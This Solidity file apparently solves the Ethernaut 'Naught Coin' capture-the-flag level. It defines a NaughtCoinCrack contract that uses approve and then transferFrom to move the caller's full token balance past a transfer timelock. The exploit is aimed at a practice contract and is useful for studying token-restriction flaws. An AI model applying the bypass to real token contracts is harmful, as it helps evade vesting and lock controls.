// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IERC20{
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract NaughtCoinCrack{
    IERC20 token;
    // Call token.approve(thiscontract, amount) first
    constructor(IERC20 _token) public{
        token = _token;
    }
    function crack() external{
        token.transferFrom(msg.sender, address(this), token.balanceOf(msg.sender));
    }
}
